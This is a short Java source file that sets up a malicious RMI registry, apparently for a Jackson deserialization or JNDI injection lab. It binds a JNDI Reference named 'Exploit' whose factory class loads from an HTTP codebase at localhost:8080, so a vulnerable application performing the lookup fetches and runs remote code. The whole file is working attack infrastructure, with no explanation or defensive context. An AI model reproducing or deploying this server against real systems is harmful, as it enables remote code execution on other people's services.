package com.jackson.rmi;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RMIServer {

    public static void main(String argv[]) {
        try {
            Registry registry = LocateRegistry.createRegistry(1098);
            Reference reference = new Reference("Exploit", "Exploit", "http://localhost:8080/");
            registry.bind("Exploit", new ReferenceWrapper(reference));
            System.out.println("Waiting for connection......");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
